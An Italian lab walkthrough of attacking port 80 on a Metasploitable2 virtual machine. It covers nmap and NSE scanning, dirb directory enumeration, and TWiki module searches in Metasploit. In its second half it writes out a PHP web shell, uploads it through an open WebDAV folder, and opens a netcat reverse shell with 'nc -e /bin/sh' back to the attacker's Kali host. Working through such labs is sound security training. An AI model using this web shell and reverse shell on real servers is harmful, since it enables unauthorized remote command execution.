# porta 80 http
A differenza di servizi come DNS e §SMTP un server web ospita applicazioni , script , database e pannelli di gestione quindi abbiamo una superficie d'attacco molto ampia.
utilizziamo il comando principale per le scansioni delle porte per verificare che quella porta sia accessibile e di conseguenza sfruttabile

- nmap -sS -Pn -sV 192.168.56.102
  - sS per invio pacchetti SYN 
  - -Pn per saltare la fase di ping visto che gia sappiamo che l'host è attivo
  - -sV per scansionare tramite risposta ad nmap le versioni
  - 192.168.56.102 ip della macchina vulnerabile

attestato il fatto che la porta sia realmente aperta procediamo con una scansione mirata con il comando

- nmap -p 80 -sC -sV 192.168.56.102
  - -p 80 indica ad nmap di effettuare la scansione su una determinata porta 80
  - -sC indica ad nmap di provare gli script nse di default *1)

*1) NSE è una delle funzioni più potenti di Nmap  permette di automatizzare compiti complessi, eseguire attacchi a forza bruta, rilevare falle di sicurezza e raccogliere informazioni dettagliate . 
- nmap -sC <target> 
  - Equivale a usare nmap --script default <target> default (default): Script di base eseguiti automaticamente quando si usa l'opzione -sC o -A. Sono sicuri e molto informativi.
- nmap --script vuln <target> Esegue tutti gli script della categoria vuln
  - safe (safe): Script non invasivi che non causano crash dei servizi né consumano troppe risorse
- intrusive (intrusive): Script aggressivi che potrebbero causare problemi ai servizi target o far scattare gli allarmi dei sistemi di rilevamento (IDS)
- vuln (vuln): Verificano la presenza di vulnerabilità note sul servizio target
- auth (auth): Rilevano e testano i meccanismi di autenticazione, inclusi attacchi a forza bruta per indovinare le password
- discovery (discovery): Interrogano i servizi per scoprire ulteriori informazioni sulla rete, come utenti connessi, database o condivisioni di file
- nmap --script-help <nome-script> per avere la documentazione di un determinato script

lanciata la scansione sulla porta con l'aiuto di nse troviamo molte informazioni utili l'output sarà simile a questo
------------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
MAC Address: 08:00:27:FA:55:6B (Oracle VirtualBox virtual NIC)
------------------------------------------------------------------------------------
analizziamo pezzo per pezzo
- 80/TCP open http
  - la porta 80 è aperta ed utilizza il protocollo TCP il servizio principale  è http
- apache httpd 2.2.8 ((ubunti) DAV/2)
  - questa è la versione esatta del server web basato su ubuntu con modulo WebDav un estensione dell'HTTP che permette agli utenti di modificare e gestire file sul server
- |_http-title: Metasploitable2 - Linux
  - utilizzando uno script di default (-sC) nmap ha scaricato la pagina principale e ci ha riportato il title
- |_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
  - Questo è l'header HTTP grezzo che il server invia a chiunque faccia una richiesta. Conferma nuovamente la versione di Apache 2.2.8

Con tutte queste informazioni possiamo intraprendere due strade diverse per per il penetration testing attraverso la porta 80 

scelta 1 : Cercare vulnerabilità note per la versione specifica di Apache 2.2.8 o per il modulo WebDAV

scelta 2: Controllare cosa è installato sul sito web per controllare possibili punti d'accesso per SQLinjection, Cross-Site Scripting(XSS) o local file inclusion(LFI)

inizieremo con la ricerca delle vulnerabilità ma prima dobbiamo capire come è impostato il server web e le sue directory bisogna pertanto stabilire quali url ([ip]/qualcosa) siano presenti. in Kali linux è presente un tool chiamato "dirb (directory buster) che esegue un brute force sul server web provando ad inseriri nell'url varie parole di uso comune e dandoci conferma se quella specifica directory esiste o meno attraverso i risultati delle richieste "200 ok" "301/302 redirect ma indica che comunque esiste" "400 404 no" "500 errore server" lanciamo quindi il comando per effettuare questa scansione

- dirb http://192.168.56.102/
  - dirb per far partire il tool
  - http:// è il servizio attivo
  - 192.168.56.102/ ip della macchina vulnerabile
  
Alla fine della scansione abbiamo una mappatura completa che ci indica ip dell'host , nome della directory, codice ricevuto, vedremo pertanto una lista questa enumerazione per cosi dire delle directory è chiamata "Directory Listing" come possiamo notare il servizio per la gestione e caricamento dei file DAV è visibile a causa di una misconfigurazione gravissima. All'interno della lista poi possiamo anche vedere il pannello di gestione del database "phpMyadmin" inclusa la sottocartella "/phpMyAdmin/setup" questo significa che potremmo riconfigurare il database semplicemente aprendo il link oppure forzare le credenziali per entrare direttamente nel pannello di controllo e infine la piattaforma TWIKI che è un servizio interno d'azienda nota per avere versioni in cui era possibile attuare un RCE (Remote Code Execution) ovvero l'esecuzione di comandi remoti operando come amministratore supremo "root" avviamo quindi il nostro framework d'attacco "metasploit" con 

- msfconsole

facciamo una ricerca per il modulo integrato di twiki

- search twiki

risultato:
---
   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------

   0  exploit/unix/webapp/moinmoin_twikidraw  2012-12-30       manual     Yes    MoinMoin twikidraw Action Traversal File Upload
   1  exploit/unix/http/twiki_debug_plugins   2014-10-09       excellent  Yes    TWiki Debugenableplugins Remote Code Execution
   2  exploit/unix/webapp/twiki_history       2005-09-14       excellent  Yes    TWiki History Function Arbitrary Command Execution
   3  exploit/unix/webapp/twiki_maketext      2012-12-15       excellent  Yes    TWiki MAKETEXT Remote Command Execution
   4  exploit/unix/webapp/twiki_search        2004-10-01       excellent  Yes    TWiki Search Function Arbitrary Command Execution
---

utilizziamo il modulo numero 4 con il comando "use" seguito dal percorso del modulo oppure semplicemente utilizzando il comando "use" seguito dal numero id del modulo in questo caso il 4

- use 4

riscontriamo adesso un errore...poiche la macchina ha una vulnerabilità nota molto vecchia non possiamo utilizzare questo specifico modulo ma non ci arrendiamo da buoni penetration testing e cerchiamo una seconda strada che guarda un pò avevamo gia preso in considerazione procediamo quindi con la scelta 2

Andiamo ad utilizzare vulnerabilità della cartella /dav/ WebDAV è un'estensione del protocollo HTTP se configurata male, permette ai client non solo di leggere, ma anche di caricare file (metodo PUT) ed eseguirli sul server web Se il server ci permette di caricare un file senza credenziali, possiamo inserire una Web Shell in PHP (una pagina web malevola) e interagirci per eseguire comandi di sistema Invece di usare Metasploit, utilizzeremo uno strumento standard di Kali Linux chiamato cadaver progettato appositamente per connettersi e interagire con le directory WebDAV come se fosse un client FTP

fase 1 verificare l'accesso tramite cadaver

- cadaver http://192.168.56.102/dav/
  - cadaver è il client a riga di comando per il protocollo WebDAV
  - Specifica l'URL esatto della cartella esposta trovata da dirb

il nostro terminale ora è cambiato da "kali@kali" a "dav:/dav/>" il che significa che siamo all'interno della cartella remota del server web

ora dobbiamo impostare la nostra web shell .php in locale apriamo pertanto un altro terminale senza chiudere quello con la connessione dav e digitiamo

scorciatoia per aprire un altro terminale " ctrl + alt + t "

- echo '<?php system($_GET["cmd"]); ?>' > shell.php
  - echo è il comando di scrittura
  - <?php ....  ?> indica il codice in linguaggio php 
  - system($_GET["cmd"]); contiene due cose molto importanti
    - system per utilizzar ei comandi di sistema
    - $_GET["cmd] è la richiesta di tipo get per inviare a sistema il comando cmd
  - " > questo simbolo serve per dire di salvare all'interno di un file
  - shell.php è il nome del file all'interno del quale vogliamo salvare

ora abbiamo il file per aprire la web shell quello che dobbiamo fare è inviare quel file tramite il comando PUT

- put shell.php

ci darà un risultato simile a questo possiamo verificare anche dentro dav tramite il comando ls

---
Uploading shell.php to `/dav/shell.php':
Progress: [=============================>] 100.0% of 31 bytes succeeded.
---
entriamo dal web nell'http appena creato utilizzando

- http://192.168.56.102/dav/shell.php?cmd=id
  - http://192.168.56.102/dav/shell.php l'url completo
  - ?cmd=id siccome cmd era una variabile inseriamo all'itnerno dell'url questa parte dove cmd diventa id e di consguenza la richiesta get sarà sull'id e vedremo effettivamente sulla pagina web che ci restituira gli id questa variabile puo essere sfruttata per inviare qualsiasi tipologia di stringa o codice

abbiamo appurato che sul servizio web possiamo effettivamente inserire codice direttamente da remoto senza richiesta di accesso ora il passo piu importante è creare una reverse shell per avere una shell completa e non solo una riga poiche limitati a poter inserire un codice per volta creiamo pertanto la connession con netcat

- nc -lvnp 4444
  - -l listen crea una connessione in ascolto agendo come server in attesa di connessioni
  - -v attiva l'output dettagliato netcat avviserà appena ci sarà una connessione con una porta specifica
  - -n evita la risoluzione dei dns lasciando i nomueri al posto dei nomi
  - -p 4444 specifica il numero di porta TCP su cui rimanere in ascolto

ora il comando chiave per avviare la connessione

- http://192.168.56.102/dav/shell.php?cmd=nc -e /bin/sh TUO_IP_KALI 4444
  - -e /bin/sh Questa è l'opzione chiave Dice a Netcat Appena ti connetti all'obiettivo, prendi la shell dei comandi Linux (/bin/sh) e assegnala interamente alla connessione di rete

ora sul nostro terminale dove abbiamo instaurato la connessione nc vedremo la scritta onnect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 42492 il che ci dice che la connessione è avvenuta vedremo solo il cursore lampeggiante la possiamo inserire comandi tranquillamente poiche è una shell cieca quindi senza mostrare riga di comando iniziamo inserendo il comando whoami che ci mostrerà il nome utente poiche le shell di netcat sono limitate dobbiamo impostare noi una shell da utilizzare per farlo utilizziamo python gia preinstallato sulla metasploitable con il comando 

- python -c 'import pty; pty.spawn("/bin/bash")'
  - python -c dice a python di eseguire il comando da riga di comando senza creare il file .py
  - import pty serve per importare un modulo interno di python chiamato pty per la gestione dei terminali di sistema
  - pty.spawn("/bin/bash")  Avvia un nuovo processo della shell Bash agganciandolo alla struttura del terminale fittizio appena creato. Questo costringe il sistema a generare un prompt visibile ed esteso

ora abbiamo una shell con riga di comando visibile l'accesso da remoto tramite l'utente standard www-data e possiamo navigare tranquillamente tra i file e le cartelle alla ricerca di informazioni sensibili da utilizzare per una privilege escalation in modo da poter effettuare modifiche da root